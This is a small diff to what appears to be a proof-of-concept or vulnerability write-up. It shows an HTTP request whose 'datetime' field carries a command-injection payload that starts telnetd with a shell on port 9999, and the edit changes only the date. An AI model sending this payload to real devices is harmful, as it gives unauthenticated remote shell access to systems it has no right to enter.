@@ -15,5 +15,5 @@ Connection: keep-alive
 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
 Cookie: curShow=
 
-datetime=2026-01-11 10:00:00"; /usr/sbin/telnetd -l /bin/sh -p 9999; #&tokenid=1936217320
+datetime=2025-05-30 10:00:00"; /usr/sbin/telnetd -l /bin/sh -p 9999; #&tokenid=1936217320
 ```
